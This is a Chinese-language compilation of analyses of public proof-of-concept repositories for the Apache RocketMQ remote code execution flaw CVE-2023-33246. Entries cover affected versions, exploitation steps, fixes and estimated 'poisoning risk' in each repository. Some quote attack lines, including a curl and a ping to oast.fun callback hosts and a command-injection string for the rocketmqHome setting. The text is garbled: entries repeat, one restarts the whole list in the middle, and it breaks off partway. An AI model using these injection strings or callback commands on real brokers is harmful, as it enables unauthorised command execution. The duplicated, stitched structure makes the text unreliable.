**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

